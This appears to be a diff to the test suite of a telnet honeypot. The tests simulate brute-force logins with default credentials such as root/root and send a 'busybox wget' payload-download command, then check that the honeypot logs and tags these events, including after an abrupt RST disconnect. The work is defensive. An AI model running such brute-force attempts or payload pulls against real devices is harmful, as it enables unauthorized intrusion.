@@ -58,7 +58,7 @@ def test_telnet_bruteforce_deny_then_accept(tmp_path):
         reader, writer = await asyncio.open_connection("127.0.0.1", port)
         for u, p in [(b"root", b"x"), (b"admin", b"y"), (b"root", b"root")]:
             await _login(reader, writer, u, p)
-        await asyncio.sleep(0.1)
+        await asyncio.wait_for(reader.readuntil(b"# "), timeout=5)  # accepted → shell prompt
         writer.close()
         try:
             await writer.wait_closed()
@@ -89,7 +89,7 @@ def test_telnet_weak_cred_accepted_immediately(tmp_path):
         port = svc._server.sockets[0].getsockname()[1]
         reader, writer = await asyncio.open_connection("127.0.0.1", port)
         await _login(reader, writer, b"root", b"root")
-        await asyncio.sleep(0.1)
+        await asyncio.wait_for(reader.readuntil(b"# "), timeout=5)  # accepted → shell prompt
         writer.close()
         try:
             await writer.wait_closed()
@@ -117,7 +117,7 @@ def test_telnet_iac_stripped_from_credentials(tmp_path):
         writer.write(b"\xff\xfd\x01root\r\n"); await writer.drain()   # IAC DO ECHO + root
         await reader.readuntil(b"Password: ")
         writer.write(b"admin\r\n"); await writer.drain()
-        await asyncio.sleep(0.1)
+        await asyncio.wait_for(reader.readuntil(b"# "), timeout=5)  # accepted → shell prompt
         writer.close()
         try:
             await writer.wait_closed()
@@ -132,6 +132,8 @@ def test_telnet_iac_stripped_from_credentials(tmp_path):
     assert creds, "no credentials event"
     assert creds[0]["request"]["user"] == "root"   # IAC bytes stripped
     assert creds[0]["request"]["password"] == "admin"
+    # accepted below bruteforce_threshold (attempts=1 < default 3): no signal
+    assert [e for e in events if "telnet-bruteforce" in e.get("tags", [])] == []
 
 
 def test_telnet_shell_captures_commands_and_payload_pull(tmp_path):
@@ -146,7 +148,7 @@ def test_telnet_shell_captures_commands_and_payload_pull(tmp_path):
         writer.write(b"busybox wget http://10.0.0.9/m\r\n"); await writer.drain()
         await reader.readuntil(b"# ")                       # canned output + next prompt
         writer.write(b"exit\r\n"); await writer.drain()
-        await asyncio.sleep(0.1)
+        await asyncio.wait_for(reader.read(), timeout=5)  # wait for server to close (handler done)
         writer.close()
         try:
             await writer.wait_closed()
@@ -195,3 +197,41 @@ def test_telnet_bruteforce_fires_on_failed_disconnect(tmp_path):
     assert bf[0]["request"]["attempts"] == 3
     assert bf[0]["request"]["accepted"] is False
     assert not [e for e in events if e.get("request", {}).get("command")]  # no shell
+
+
+def test_telnet_bruteforce_fires_on_abrupt_reset(tmp_path):
+    # An abortive RST close (network drop / killed sample) after crossing the
+    # threshold raises ConnectionResetError in the handler — the signal must
+    # still fire, from `finally`.
+    import socket
+    import struct
+    svc, sink, log = _mksvc(tmp_path, accept_after=99, bruteforce_threshold=3)
+
+    async def scenario():
+        await svc.start()
+        port = svc._server.sockets[0].getsockname()[1]
+        reader, writer = await asyncio.open_connection("127.0.0.1", port)
+        for u, p in [(b"root", b"1"), (b"admin", b"2"), (b"root", b"3")]:
+            await _login(reader, writer, u, p)
+        sock = writer.get_extra_info("socket")
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
+        writer.close()                       # RST, not a clean FIN
+        try:
+            await writer.wait_closed()
+        except Exception:
+            pass
+        # poll the CONDITION (not a fixed sleep) so the handler observes the RST
+        # and emits from finally before the loop tears down.
+        for _ in range(300):
+            if log.exists() and "telnet-bruteforce" in log.read_text():
+                break
+            await asyncio.sleep(0.01)
+        await svc.stop()
+
+    asyncio.run(scenario())
+    sink.close()
+    events = _wait_for_events(log)
+    bf = [e for e in events if "telnet-bruteforce" in e.get("tags", [])]
+    assert bf, "telnet-bruteforce not fired on an abrupt RST disconnect"
+    assert bf[0]["request"]["attempts"] == 3
+    assert bf[0]["request"]["accepted"] is False
